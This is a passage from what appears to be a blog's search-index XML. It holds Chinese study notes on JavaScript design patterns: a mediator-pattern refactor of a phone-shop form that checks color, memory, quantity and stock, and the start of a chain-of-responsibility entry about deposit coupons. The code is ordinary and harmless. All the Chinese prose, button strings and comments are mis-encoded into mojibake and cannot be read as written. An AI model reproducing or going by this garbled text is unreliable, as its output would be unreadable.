id="colorInfo"&gt;&lt;/div&gt;æ‚¨è¾“å…¥äº†æ•°é‡ï¼š&lt;div id="numberInfo"&gt;&lt;/div&gt;&lt;button id="nextBtn" disabled="true"&gt;è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²å’Œè´­ä¹°æ•°é‡&lt;/button&gt; æŽ¥ä¸‹æ¥ç›‘å¬ colorSelect çš„ onchange äº‹ä»¶å‡½æ•°å’Œ numberInput çš„ oninput äº‹ä»¶å‡½æ•°ï¼Œç„¶åŽåœ¨è¿™ä¸¤ä¸ªäº‹ä»¶ä¸­åšå‡ºç›¸åº”å¤„ç†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const colorSelect = document.getElementById('colorSelect'),numberInput = document.getElementById('numberInput'),colorInfo = document.getElementById('colorInfo'),numberInfo = document.getElementById('numberInfo'),nextBtn = document.getElementById('nextBtn');const goods =&#123; 'red':3, 'blue':6&#125;colorSelect.onchange = function()&#123; let color = this.value, number = numberInput.value, stock = goods[color]; console.log(color); colorInfo.innerHTML = color; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦';&#125;numberInput.oninput = function()&#123; let color = colorSelect.value, number = this.value, stock = goods[color]; numberInfo.innerHTML = number; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦';&#125; å¯èƒ½é‡åˆ°çš„å›°éš¾è™½ç„¶ç›®å‰é¡ºåˆ©å®Œæˆäº†ä»£ç ç¼–å†™ï¼Œä½†éšä¹‹è€Œæ¥çš„éœ€æ±‚æ”¹å˜æœ‰å¯èƒ½ç»™æˆ‘ä»¬å¸¦æ¥éº»çƒ¦ã€‚å‡è®¾çŽ°åœ¨è¦æ±‚åŽ»æŽ‰ colorInfo å’Œ numberInfo è¿™ä¸¤ä¸ªå±•ç¤ºåŒºåŸŸï¼Œæˆ‘ä»¬å°±è¦åˆ†åˆ«æ”¹åŠ¨ colorSelect.onchange å’ŒnumberInput.onput é‡Œé¢çš„ä»£ç ï¼Œå› ä¸ºåœ¨å…ˆå‰çš„ä»£ç ä¸­ï¼Œè¿™äº›å¯¹è±¡ç¡®å®žæ˜¯è€¦åˆåœ¨ä¸€èµ·çš„ã€‚ç›®å‰æˆ‘ä»¬é¢ä¸´çš„å¯¹è±¡è¿˜ä¸ç®—å¤ªå¤šï¼Œå½“è¿™ä¸ªé¡µé¢é‡Œçš„èŠ‚ç‚¹æ¿€å¢žåˆ° 10 ä¸ªæˆ–è€… 15 ä¸ªæ—¶ï¼Œå®ƒä»¬ä¹‹é—´çš„è”ç³»å¯èƒ½å˜å¾—æ›´åŠ é”™ç»¼å¤æ‚ï¼Œä»»ä½•ä¸€æ¬¡æ”¹åŠ¨éƒ½å°†å˜å¾—å¾ˆæ£˜æ‰‹ã€‚ä¸ºäº†è¯å®žè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å‡è®¾é¡µé¢ä¸­å°†æ–°å¢žå¦å¤–ä¸€ä¸ªä¸‹æ‹‰é€‰æ‹©æ¡†ï¼Œä»£è¡¨é€‰æ‹©æ‰‹æœºå†…å­˜ã€‚çŽ°åœ¨æˆ‘ä»¬éœ€è¦è®¡ç®—é¢œè‰²ã€å†…å­˜å’Œè´­ä¹°æ•°é‡ï¼Œæ¥åˆ¤æ–­ nextBtn æ˜¯æ˜¾ç¤ºåº“å­˜ä¸è¶³è¿˜æ˜¯æ”¾å…¥è´­ç‰©è½¦ã€‚ é¦–å…ˆæˆ‘ä»¬è¦å¢žåŠ ä¸¤ä¸ª HTML èŠ‚ç‚¹ï¼š 123456789101112131415é€‰æ‹©é¢œè‰²ï¼š&lt;select id="colorSelect"&gt; &lt;option value=""&gt;è¯·é€‰æ‹©&lt;/option&gt; &lt;option value="red"&gt;çº¢è‰²&lt;/option&gt; &lt;option value="blue"&gt;è“è‰²&lt;/option&gt;&lt;/select&gt;é€‰æ‹©å†…å­˜: &lt;select id="memorySelect"&gt; &lt;option value=""&gt;è¯·é€‰æ‹©&lt;/option&gt; &lt;option value="32G"&gt;32G&lt;/option&gt; &lt;option value="16G"&gt;16G&lt;/option&gt; &lt;/select&gt; è¾“å…¥è´­ä¹°æ•°é‡ï¼š&lt;input type="text" id="numberInput"&gt;&lt;br/&gt; æ‚¨é€‰æ‹©äº†é¢œè‰²ï¼š&lt;div id="colorInfo"&gt;&lt;/div&gt;&lt;br/&gt; æ‚¨é€‰æ‹©äº†å†…å­˜: &lt;div id="memoryInfo"&gt;&lt;/div&gt;&lt;br/&gt; æ‚¨è¾“å…¥äº†æ•°é‡ï¼š&lt;div id="numberInfo"&gt;&lt;/div&gt;&lt;br/&gt; &lt;button id="nextBtn" disabled="true"&gt;è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²å’Œè´­ä¹°æ•°é‡&lt;/button&gt; æŽ¥ç€å¢žåŠ  memorySelect çš„onchange äº‹ä»¶å‡½æ•°ï¼Œæ”¹å˜ä¹‹å‰çš„ colorSelect å’Œ numberInputäº‹ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104const colorSelect = document.getElementById('colorSelect'),numberInput = document.getElementById('numberInput'),colorInfo = document.getElementById('colorInfo'),numberInfo = document.getElementById('numberInfo'),nextBtn = document.getElementById('nextBtn'),memorySelect = document.getElementById( 'memorySelect' ), memoryInfo = document.getElementById( 'memoryInfo' );const goods =&#123; "red|32G": 3, // çº¢è‰² 32Gï¼Œåº“å­˜æ•°é‡ä¸º 3 "red|16G": 0, "blue|32G": 1, "blue|16G": 6 &#125;colorSelect.onchange = function()&#123; let color = this.value, memory = memorySelect.value, number = numberInput.value, stock = goods[color+'|'+memory]; colorInfo.innerHTML = color; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©å†…å­˜å¤§å°'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦';&#125;memorySelect.onchange = function()&#123; let color = colorSelect.value, memory = this.value, number = numberInput.value, stock = goods[color+'|'+memory]; memoryInfo.innerHTML = memory; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©å†…å­˜å¤§å°'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦';&#125; numberInput.oninput = function()&#123; let color = colorSelect.value, memory = memorySelect.value, number = this.value, stock = goods[color+'|'+memory]; numberInfo.innerHTML = number; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©å†…å­˜å¤§å°'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦';&#125; æˆ‘ä»¬ä»…ä»…æ˜¯å¢žåŠ ä¸€ä¸ªå†…å­˜çš„é€‰æ‹©æ¡ä»¶ï¼Œå°±è¦æ”¹å˜å¦‚æ­¤å¤šçš„ä»£ç ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç›®å‰çš„å®žçŽ°ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹å¯¹è±¡éƒ½æ˜¯è€¦åˆåœ¨ä¸€èµ·çš„ï¼Œæ”¹å˜æˆ–è€…å¢žåŠ ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹å¯¹è±¡ï¼Œéƒ½è¦é€šçŸ¥åˆ°ä¸Žå…¶ç›¸å…³çš„å¯¹è±¡ã€‚ å¼•å…¥ä¸­ä»‹è€…çŽ°åœ¨æˆ‘ä»¬æ¥å¼•å…¥ä¸­ä»‹è€…å¯¹è±¡ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹å¯¹è±¡åªè·Ÿä¸­ä»‹è€…é€šä¿¡ã€‚å½“ä¸‹æ‹‰é€‰æ‹©æ¡† colorSelectã€memorySelect å’Œæ–‡æœ¬è¾“å…¥æ¡† numberInput å‘ç”Ÿäº†äº‹ä»¶è¡Œä¸ºæ—¶ï¼Œå®ƒä»¬ä»…ä»…é€šçŸ¥ä¸­ä»‹è€…å®ƒä»¬è¢«æ”¹äº†ï¼ŒåŒæ—¶æŠŠè‡ªèº«å½“ä½œå‚æ•°ä¼ å…¥ä¸­ä»‹è€…ï¼Œä»¥ä¾¿ä¸­ä»‹è€…è¾¨åˆ«æ˜¯è°å‘ç”Ÿäº†æ”¹å˜ã€‚å‰©ä¸‹çš„æ‰€æœ‰äº‹æƒ…éƒ½äº¤ç»™ä¸­ä»‹è€…å¯¹è±¡æ¥å®Œæˆï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ— è®ºæ˜¯ä¿®æ”¹è¿˜æ˜¯æ–°å¢žèŠ‚ç‚¹ï¼Œéƒ½åªéœ€è¦æ”¹åŠ¨ä¸­ä»‹è€…å¯¹è±¡é‡Œçš„ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const goods =&#123; "red|32G": 3, // çº¢è‰² 32Gï¼Œåº“å­˜æ•°é‡ä¸º 3 "red|16G": 0, "blue|32G": 1, "blue|16G": 6 &#125; const mediator = (function()&#123; const colorSelect = document.getElementById('colorSelect'), numberInput = document.getElementById('numberInput'), colorInfo = document.getElementById('colorInfo'), numberInfo = document.getElementById('numberInfo'), nextBtn = document.getElementById('nextBtn'), memorySelect = document.getElementById( 'memorySelect' ), memoryInfo = document.getElementById( 'memoryInfo' ); return&#123; changed:function(obj)&#123; let color = colorSelect.value, memory = memorySelect.value, number = numberInput.value, stock = goods[color+'|'+memory]; if(obj === colorSelect)&#123; // åˆ¤æ–­æ˜¯å“ªä¸ªé€‰æ‹©æ¡†æˆ–è€…æ˜¯è¾“å…¥æ¡†å¯¹åº”èµ‹å€¼ colorInfo.innerHTML = color; &#125;else if(obj === memorySelect)&#123; memoryInfo.innerHTML = memory; &#125;else if(obj === numberInput)&#123; numberInfo.innerHTML = number; &#125; if(!color)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©æ‰‹æœºé¢œè‰²'; return; &#125; if(!memory)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·é€‰æ‹©å†…å­˜å¤§å°'; return; &#125; if(((number - 0)|0) !== number - 0)&#123; //ç”¨æˆ·è¾“å…¥çš„è´­ä¹°æ•°é‡æ˜¯ä¸ºæ­£æ•´æ•° nextBtn.disabled = true; nextBtn.innerHTML = 'è¯·è¾“å…¥æ­£ç¡®çš„è´­ä¹°æ•°é‡'; return; &#125; if(number &gt; stock)&#123; nextBtn.disabled = true; nextBtn.innerHTML = 'åº“å­˜ä¸è¶³'; return; &#125; nextBtn.disabled = false; nextBtn.innerHTML = 'æ”¾å…¥è´­ç‰©è½¦'; &#125; &#125;&#125;)();// äº‹ä»¶å‡½æ•°colorSelect.onchange = function()&#123; mediator.changed(this);&#125;memorySelect.onchange = function()&#123; mediator.changed(this);&#125;numberInput.onchange = function()&#123; mediator.changed(this);&#125; å¯ä»¥æƒ³è±¡ï¼ŒæŸå¤©æˆ‘ä»¬åˆè¦æ–°å¢žä¸€äº›è·Ÿéœ€æ±‚ç›¸å…³çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚ CPU åž‹å·ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦ç¨ç¨æ”¹åŠ¨ mediator å¯¹è±¡å³å¯ï¼š 123456789101112131415161718192021var goods = &#123; // æ‰‹æœºåº“å­˜ "red|32G|800": 3, // é¢œè‰² redï¼Œå†…å­˜ 32Gï¼Œcpu800ï¼Œå¯¹åº”åº“å­˜æ•°é‡ä¸º 3 "red|16G|801": 0, "blue|32G|800": 1, "blue|16G|801": 6 &#125;; var mediator = (function()&#123; // ç•¥ var cpuSelect = document.getElementById( 'cpuSelect' ); return &#123; change: function(obj)&#123; // ç•¥ var cpu = cpuSelect.value, stock = goods[ color + '|' + memory + '|' + cpu ]; if ( obj === cpuSelect )&#123; cpuInfo.innerHTML = cpu; &#125; // ç•¥ &#125; &#125; &#125;)(); å°ç»“ä¸­ä»‹è€…æ¨¡å¼æ˜¯è¿Žåˆè¿ªç±³ç‰¹æ³•åˆ™çš„ä¸€ç§å®žçŽ°ã€‚ä¹Ÿå«åšæœ€å°‘çŸ¥è¯†åŽŸåˆ™ï¼Œæ˜¯æŒ‡ä¸€ä¸ªå¯¹è±¡åº”è¯¥å°½å¯èƒ½å°‘åœ°äº†è§£å¦å¤–çš„å¯¹è±¡ã€‚å¦‚æžœå¯¹è±¡ä¹‹é—´è€¦åˆæ€§å¤ªé«˜ï¼Œä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜ä¹‹åŽï¼Œéš¾å…ä¼šå½±å“å…¶ä»–çš„å¯¹è±¡ã€‚è€Œåœ¨ä¸­ä»‹è€…æ¨¡å¼ä¸­ï¼Œå¯¹è±¡ä¹‹é—´å‡ ä¹Žä¸çŸ¥é“å½¼æ­¤çš„å­˜åœ¨ï¼Œå®ƒä»¬åªèƒ½é€šè¿‡ä¸­ä»‹è€…å¯¹è±¡æ¥äº’ç›¸å½±å“å¯¹æ–¹ã€‚ å› æ­¤ï¼Œä¸­ä»‹è€…æ¨¡å¼ä½¿å„ä¸ªå¯¹è±¡ä¹‹é—´å¾—ä»¥è§£è€¦ï¼Œä»¥ä¸­ä»‹è€…å’Œå¯¹è±¡ä¹‹é—´çš„ä¸€å¯¹å¤šå…³ç³»å–ä»£äº†å¯¹è±¡ä¹‹é—´ç½‘çŠ¶çš„å¤šå¯¹å¤šçš„å…³ç³»ã€‚å„ä¸ªå¯¹è±¡åªéœ€è¦å…³æ³¨åŠŸèƒ½çš„è¯´ç¬‘å‘¢ï¼Œå¯¹è±¡ä¹‹é—´çš„äº¤äº’å…³ç³»äº¤ç»™äº†ä¸­ä»‹è€…å¯¹è±¡æ¥ç»´æŠ¤ã€‚ ä¸è¿‡ï¼Œä¸­ä»‹è€…æ¨¡å¼ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹ã€‚å…¶ä¸­ï¼Œæœ€å¤§çš„ç¼ºç‚¹å°±æ˜¯ç³»ç»Ÿä¸­ä¼šæ–°å¢žä¸€ä¸ªä¸­ä»‹è€…å¯¹è±¡ï¼Œå› æ­¤å¯¹è±¡ä¹‹é—´äº¤äº’çš„å¤æ‚æ€§ï¼Œè½¬ç§»æˆäº†ä¸­ä»‹è€…å¯¹è±¡çš„å¤æ‚æ€§ï¼Œä½¿å¾—ä¸­ä»‹è€…å¯¹è±¡ç»å¸¸æ˜¯å·¨å¤§çš„ã€‚ä¸­ä»‹è€…å¯¹è±¡è‡ªèº«å¾€å¾€æ˜¯ä¸€ä¸ªéš¾ä»¥ç»´æŠ¤çš„å¯¹è±¡ã€‚ æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯’è´©å­è™½ç„¶ä½¿å¸æ¯’è€…å’Œåˆ¶æ¯’è€…ä¹‹é—´çš„è€¦åˆåº¦é™ä½Žï¼Œä½†æ¯’è´©å­ä¹Ÿè¦æŠ½èµ°ä¸€éƒ¨åˆ†åˆ©æ¶¦ã€‚åŒæ ·ï¼Œåœ¨ç¨‹åºä¸­ï¼Œä¸­ä»‹è€…å¯¹è±¡è¦å åŽ»ä¸€éƒ¨åˆ†å†…å­˜ã€‚è€Œä¸”æ¯’è´©æœ¬èº«è¿˜è¦é˜²æ­¢è¢«è­¦å¯ŸæŠ“ä½ï¼Œå› ä¸ºå®ƒäº†è§£æ•´ä¸ªçŠ¯ç½ªé“¾æ¡ä¸­çš„æ‰€æœ‰å…³ç³»ï¼Œè¿™è¡¨æ˜Žä¸­ä»‹è€…å¯¹è±¡è‡ªèº«å¾€å¾€æ˜¯ä¸€ä¸ªéš¾ä»¥ç»´æŠ¤çš„å¯¹è±¡ã€‚ ä¸­ä»‹è€…æ¨¡å¼å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°å¯¹æ¨¡å—æˆ–è€…å¯¹è±¡è¿›è¡Œè§£è€¦ï¼Œä½†å¯¹è±¡ä¹‹é—´å¹¶éžä¸€å®šéœ€è¦è§£è€¦ã€‚åœ¨å®žé™…é¡¹ç›®ä¸­ï¼Œæ¨¡å—æˆ–å¯¹è±¡ä¹‹é—´æœ‰äº›ä¾èµ–å…³ç³»æ˜¯å¾ˆæ­£å¸¸çš„ã€‚å…³é”®åœ¨äºŽå¦‚ä½•å–è¡¡é‡å¯¹è±¡ä¹‹é—´çš„è€¦åˆç¨‹åº¦ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æžœå¯¹è±¡ä¹‹é—´ çš„å¤æ‚è€¦åˆç¡®å®žå¯¼è‡´è°ƒç”¨å’Œç»´æŠ¤å‡ºçŽ°äº†å›°éš¾ï¼Œè€Œä¸”è¿™äº›è€¦åˆåº¦éšç€é¡¹ç›®çš„å˜åŒ–å‘ˆçŽ°å‡ºæ¥æŒ‡æ•°å¢žé•¿æ›²çº¿ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ç”¨ä¸­ä»‹è€…æ¨¡å¼æ¥é‡æž„ä»£ç ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”èŒè´£é“¾æ¨¡å¼]]></title>
    <url>%2F2019-03-12-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”èŒè´£é“¾æ¨¡å¼èŒè´£é“¾æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»Žè€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’ŒæŽ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ï¼Œå°†è¿™äº›å¯¹è±¡è¿žæˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚ ä¸€ç³»åˆ—å¯èƒ½ä¼šè¯·æ±‚çš„å¯¹è±¡è¢«è¿žæŽ¥æˆä¸€æ¡é“¾ï¼Œè¯·æ±‚åœ¨è¿™äº›å¯¹è±¡ä¹‹é—´ä¾æ¬¡ä¼ é€’ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªå¯ä»¥å¤„ç†å®ƒçš„å¯¹è±¡ï¼Œæˆ‘ä»¬æŠŠè¿™äº›å¯¹è±¡ç§°ä¸ºé“¾ä¸­çš„èŠ‚ç‚¹ã€‚ çŽ°å®žä¸­çš„èŒè´£é“¾æ¨¡å¼èŒè´£é“¾æ¨¡å¼çš„ä¾‹å­åœ¨çŽ°å®žä¸­å¹¶ä¸éš¾æ‰¾åˆ°ï¼Œä»¥ä¸‹å°±æ˜¯ä¸¤ä¸ªå¸¸è§çš„è·ŸèŒè´£é“¾æ¨¡å¼æœ‰å…³çš„åœºæ™¯ã€‚ å¦‚æžœæ—©é«˜å³°èƒ½é¡ºåˆ©æŒ¤ä¸Šå…¬äº¤è½¦çš„è¯ï¼Œé‚£ä¹ˆä¼°è®¡è¿™ä¸€å¤©éƒ½ä¼šè¿‡å¾—å¾ˆå¼€å¿ƒã€‚å› ä¸ºå…¬äº¤è½¦ä¸Šäººå®žåœ¨å¤ªå¤šäº†ï¼Œç»å¸¸ä¸Šè½¦åŽå´æ‰¾ä¸åˆ°å”®ç¥¨å‘˜åœ¨å“ªï¼Œæ‰€ä»¥åªå¥½æŠŠä¸¤å—é’±ç¡¬å¸å¾€å‰é¢é€’ã€‚é™¤éžä½ è¿æ°”å¤Ÿå¥½ï¼Œç«™åœ¨ä½ å‰é¢çš„ç¬¬ä¸€ä¸ªäººå°±æ˜¯å”®ç¥¨å‘˜ï¼Œå¦åˆ™ï¼Œä½ çš„ç¡¬å¸é€šå¸¸è¦åœ¨ N ä¸ªäººæ‰‹ä¸Šä¼ é€’ï¼Œæ‰èƒ½æœ€ç»ˆåˆ°è¾¾å”®ç¥¨å‘˜çš„æ‰‹é‡Œã€‚ ä¸­å­¦æ—¶ä»£çš„æœŸæœ«è€ƒè¯•ï¼Œå¦‚æžœä½ å¹³æ—¶ä¸å¤ªè€å®žï¼Œè€ƒè¯•æ—¶å°±ä¼šè¢«å®‰æŽ’åœ¨ç¬¬ä¸€ä¸ªä½ç½®ã€‚é‡åˆ°ä¸ä¼šç­”çš„é¢˜ç›®ï¼Œå°±æŠŠé¢˜ç›®ç¼–å·å†™åœ¨å°çº¸æ¡ä¸Šå¾€åŽä¼ é€’ï¼Œååœ¨åŽé¢çš„åŒå­¦å¦‚æžœä¹Ÿä¸ä¼šç­”ï¼Œä»–å°±ä¼šæŠŠè¿™å¼ å°çº¸æ¡ç»§ç»­é€’ç»™ä»–åŽé¢çš„äºº ä»Žè¿™ä¸¤ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ‰¾åˆ°èŒè´£é“¾æ¨¡å¼çš„æœ€å¤§ä¼˜ç‚¹ï¼šè¯·æ±‚å‘é€è€…åªéœ€è¦çŸ¥é“é“¾ä¸­çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»Žè€Œå¼±åŒ–äº†å‘é€è€…å’Œä¸€ç»„æŽ¥æ”¶è€…ä¹‹é—´çš„å¼ºè”ç³»ã€‚å¦‚æžœä¸ä½¿ç”¨èŒè´£é“¾æ¨¡å¼ï¼Œé‚£ä¹ˆåœ¨å…¬äº¤è½¦ä¸Šï¼Œæˆ‘å°±å¾—å…ˆæžæ¸…æ¥šè°æ˜¯å”®ç¥¨å‘˜ï¼Œæ‰èƒ½æŠŠç¡¬å¸é€’ç»™ä»–ã€‚åŒæ ·ï¼Œåœ¨æœŸæœ«è€ƒè¯•ä¸­ï¼Œä¹Ÿè®¸æˆ‘å°±è¦å…ˆäº†è§£åŒå­¦ä¸­æœ‰å“ªäº›å¯ä»¥è§£ç­”è¿™é“é¢˜ å®žé™…å¼€å‘ä¸­çš„èŒè´£é“¾æ¨¡å¼å‡è®¾æˆ‘ä»¬è´Ÿè´£ä¸€ä¸ªå”®å–æ‰‹æœºçš„ç”µå•†ç½‘ç«™ï¼Œç»è¿‡åˆ†åˆ«äº¤çº³ 500 å…ƒå®šé‡‘å’Œ 200 å…ƒå®šé‡‘çš„ä¸¤è½®é¢„å®šåŽï¼ˆè®¢å•å·²åœ¨æ­¤æ—¶ç”Ÿæˆï¼‰ï¼ŒçŽ°åœ¨å·²ç»åˆ°äº†æ­£å¼è´­ä¹°çš„é˜¶æ®µã€‚ å…¬å¸é’ˆå¯¹æ”¯ä»˜è¿‡å®šé‡‘çš„ç”¨æˆ·æœ‰ä¸€å®šçš„ä¼˜æƒ æ”¿ç­–ã€‚åœ¨æ­£å¼è´­ä¹°åŽï¼Œå·²ç»æ”¯ä»˜è¿‡ 500 å…ƒå®šé‡‘çš„ç”¨æˆ·ä¼šæ”¶åˆ° 100 å…ƒçš„å•†åŸŽä¼˜æƒ åˆ¸ï¼Œ200 å…ƒå®šé‡‘çš„ç”¨æˆ·å¯ä»¥æ”¶åˆ° 50 å…ƒçš„ä¼˜æƒ åˆ¸ï¼Œè€Œä¹‹å‰æ²¡æœ‰æ”¯ä»˜å®šé‡‘çš„ç”¨æˆ·åªèƒ½è¿›å…¥æ™®é€šè´­ä¹°æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰ä¼˜æƒ åˆ¸ï¼Œä¸”åœ¨åº“å­˜æœ‰é™çš„æƒ…å†µä¸‹ä¸ä¸€å®šä¿è¯èƒ½ä¹°åˆ° æˆ‘ä»¬çš„è®¢å•é¡µé¢æ˜¯ PHP åå‡ºçš„æ¨¡æ¿ï¼Œåœ¨é¡µé¢åŠ è½½ä¹‹åˆï¼ŒPHP ä¼šä¼ é€’ç»™é¡µé¢å‡ ä¸ªå­—æ®µï¼š orderTypeï¼šè¡¨ç¤ºè®¢å•ç±»åž‹ï¼ˆå®šé‡‘ç”¨æˆ·æˆ–è€…æ™®é€šè´­ä¹°ç”¨æˆ·ï¼‰ï¼Œcode çš„å€¼ä¸º 1 çš„æ—¶å€™æ˜¯ 500 å…ƒå®šé‡‘ç”¨æˆ·ï¼Œä¸º 2 çš„æ—¶å€™æ˜¯ 200 å…ƒå®šé‡‘ç”¨æˆ·ï¼Œä¸º 3 çš„æ—¶å€™æ˜¯æ™®é€šè´­ä¹°ç”¨æˆ·ã€‚ payï¼šè¡¨ç¤ºç”¨æˆ·æ˜¯å¦å·²ç»æ”¯ä»˜å®šé‡‘ï¼Œå€¼ä¸º true æˆ–è€… false, è™½ç„¶ç”¨æˆ·å·²ç»ä¸‹è¿‡ 500 å…ƒå®šé‡‘çš„è®¢å•ï¼Œä½†å¦‚æžœä»–ä¸€ç›´æ²¡æœ‰æ”¯ä»˜å®šé‡‘ï¼ŒçŽ°åœ¨åªèƒ½é™çº§è¿›å…¥æ™®é€šè´­ä¹°æ¨¡å¼ stockï¼šè¡¨ç¤ºå½“å‰ç”¨äºŽæ™®é€šè´­ä¹°çš„æ‰‹æœºåº“å­˜æ•°é‡ï¼Œå·²ç»æ”¯ä»˜è¿‡ 500 